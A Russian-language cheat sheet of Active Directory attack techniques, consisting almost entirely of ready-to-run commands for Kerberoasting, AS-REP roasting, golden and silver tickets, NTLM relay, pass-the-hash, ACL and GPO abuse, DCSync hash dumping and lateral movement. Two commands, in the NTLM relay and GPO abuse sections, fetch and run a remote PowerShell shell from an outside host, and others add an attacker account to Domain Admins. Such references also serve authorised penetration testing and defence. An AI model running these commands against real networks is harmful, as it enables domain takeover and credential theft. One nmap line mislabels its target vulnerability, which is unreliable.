# 🏢 Active Directory Exploitation Cheat Sheet

**Полное руководство по атакам на Active Directory.**  
Включает техники разведки, атак на Kerberos, NTLM, ACL, GPO, DCSync и перемещение по сети.

---

## 📚 Оглавление
1. [Разведка AD](#-разведка-ad)
2. [Kerberos Атаки](#-kerberos-атаки)
3. [NTLM Атаки](#-ntlm-атаки)
4. [ACL Abuse](#-acl-abuse)
5. [GPO Attacks](#-gpo-attacks)
6. [DCSync](#-dcsync)
7. [Lateral Movement](#-lateral-movement)
8. [Полезные инструменты](#-полезные-инструменты)

---

## 🔍 Разведка AD

### 1.1 Сбор информации через LDAP

| Команда | Описание (RU) | Описание (EN) |
|---------|---------------|---------------|
| `ldapsearch -x -H ldap://dc.domain.local -b "dc=domain,dc=local"` | Подключение к LDAP без аутентификации. | Connect to LDAP anonymously. |
| `bloodhound-python -c All -d domain.local -u user -p pass -ns 10.10.10.10` | Сбор данных для BloodHound. | Collect data for BloodHound. |
| `nmap -p 389 --script ldap-rootdse 10.10.10.10` | Получение Root DSE информации. | Get Root DSE info. |

### 1.2 Поиск пользователей и компьютеров

```bash
# Получить список всех пользователей
net user /domain

# Получить список всех компьютеров
net group "Domain Computers" /domain

Kerberos Атаки
2.1 AS-REP Roasting
Принцип: Если у пользователя отключена предварительная аутентификация (Kerberos Pre-Auth), можно запросить хэш и взломать его оффлайн.
# Запрос хэшей через impacket
impacket-GetNPUsers domain.local/ -usersfile users.txt -request -format hashcat

# Пример вывода
$krb5asrep$23$user@DOMAIN.LOCAL:hash...

# Взлом через hashcat
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt

2.2 Kerberoasting
Принцип: Любой пользователь может запросить билет сервиса (TGS) для SPN. Билет зашифрован ключом сервисного аккаунта.
# Запрос SPN через impacket
impacket-GetUserSPNs domain.local/username:password -request

# Взлом через hashcat
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

# PowerView
Get-NetUser -SPN | select samaccountname, serviceprincipalname

2.3 Pass-the-Ticket
Принцип: Использование украденного билета Kerberos (TGT или TGS) для аутентификации.
# Захват билетов с помощью mimikatz
mimikatz # sekurlsa::tickets /export

# Внедрение билета
mimikatz # kerberos::ptt ticket.kirbi

# Использование Rubeus
Rubeus.exe asktgt /user:admin /rc4:hash /ptt

2.4 Golden Ticket
Принцип: Создание TGT для любого пользователя, включая администратора домена.
# Mimikatz
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /ptt

# Impacket
ticketer.py -nthash krbtgt_hash -domain-sid S-1-5-21-... -domain domain.local Administrator

2.5 Silver Ticket
Принцип: Создание TGS для конкретного сервиса без обращения к KDC.
# Mimikatz
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:dc.domain.local /service:cifs /rc4:hash /ptt

# Имперсонация сервиса
dir \\dc.domain.local\c$

 NTLM Атаки
3.1 NTLM Relay
Принцип: Перехват и ретрансляция NTLM-авторизации на другую машину.
# Запуск relay сервера
impacket-ntlmrelayx -tf targets.txt -smb2support

# Вызов аутентификации (например, через Responder)
responder -I eth0 -wrf

# Создание шелла через SMB relay
impacket-ntlmrelayx -t smb://target -smb2support -e "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/shell.ps1')"

3.2 Pass-the-Hash
Принцип: Использование NTLM-хэша для аутентификации без пароля.
# Impacket
impacket-psexec domain/user@10.10.10.10 -hashes :hash

# Metasploit
use exploit/windows/smb/psexec
set SMBPass hash

# CrackMapExec (NetExec)
nxc smb 10.10.10.10 -u user -H hash

3.3 LLMNR/NBT-NS Poisoning
Принцип: Ответ на широковещательные запросы, когда имя хоста не найдено в DNS.
# Запуск Responder
responder -I eth0 -wrf

# Полученный хэш можно взломать или использовать для relay

 ACL Abuse
4.1 Поиск уязвимых ACL через BloodHound
# Запрос в BloodHound
MATCH (u:User)-[:GenericWrite|GenericAll|WriteDacl]->(o) RETURN u,o

4.2 GenericWrite — Добавление пользователя в группу
# Использование PowerView
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker

# Impacket
impacket-dacledit -action write -rights GenericWrite -principal attacker -target "Domain Admins"

4.3 WriteDACL — Изменение прав на объект
# PowerView
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All

4.4 GenericAll — Полный контроль над объектом
# Изменение пароля пользователя
net user targetuser newpass /domain

# PowerView
Set-DomainUserPassword -Identity targetuser -AccountPassword newpass

 GPO Attacks
5.1 Поиск уязвимых GPO
# PowerView
Get-DomainGPO | Get-DomainObjectAcl | Where-Object {$_.ActiveDirectoryRights -like "*Write*"}

# BloodHound
MATCH (g:GPO)-[:GpLink]->(c:Computer) RETURN g,c

5.2 Эксплуатация GPO через SharpGPOAbuse
# Добавление локального администратора
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Default Domain Policy"

# Запуск скрипта на всех компьютерах
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "NT AUTHORITY" --Command "cmd.exe" --Arguments "/c powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/shell.ps1')" --GPOName "Default Domain Policy"

5.3 Force GPO Update
# На целевой машине
gpupdate /force

# Удаленно через psexec
psexec \\target cmd /c "gpupdate /force"

 DCSync
Принцип: Использование прав на репликацию для извлечения всех хэшей домена.
# Impacket
impacket-secretsdump domain/user:pass@dc.domain.local -just-dc

# Mimikatz
mimikatz # lsadump::dcsync /user:krbtgt
mimikatz # lsadump::dcsync /all

# Использование DCSync с полученными правами
impacket-secretsdump domain/attacker:pass@10.10.10.10 -just-dc -outputfile dc_hashes

Lateral Movement
Psexec
# Impacket
impacket-psexec domain/user:pass@10.10.10.10

# NetExec
nxc smb 10.10.10.10 -u user -p pass -x "whoami"

7.2 WinRM / PowerShell Remoting
# Enter-PSSession
Enter-PSSession -ComputerName 10.10.10.10 -Credential domain\user

# Invoke-Command
Invoke-Command -ComputerName 10.10.10.10 -ScriptBlock {whoami} -Credential domain\user

7.3 WMI
# wmic
wmic /node:10.10.10.10 /user:domain\user /password:pass process call create "cmd.exe /c calc"

# Impacket
impacket-wmiexec domain/user:pass@10.10.10.10

7.4 RDP
# xfreerdp
xfreerdp /v:10.10.10.10 /u:user /p:pass

# Проверка на уязвимость BlueKeep (CVE-2019-0708)
nmap -p 3389 --script rdp-vuln-ms12-020 10.10.10.10

Полезные инструменты
Инструмент	Назначение
Impacket	Набор Python-скриптов для работы с сетевыми протоколами (psexec, secretsdump, GetNPUsers)
BloodHound	Визуализация путей атак в AD
NetExec	Замена CrackMapExec — пост-эксплуатация
Mimikatz	Извлечение паролей, билетов, хэшей из памяти
PowerSploit	Модули PowerShell для разведки и эксплуатации
Rubeus	Инструмент для атак на Kerberos
SharpHound	Сборщик данных для BloodHound (C#)
Kerbrute	Брутфорс пользователей Kerberos
📚 Источники и дополнительная литература
Internal All The Things — AD

Hacking Articles — Active Directory

PayloadsAllTheThings — AD

# PowerView (входит в PowerSploit)
Get-NetUser | select samaccountname, description
Get-NetComputer | select dnshostname, operatingsystem
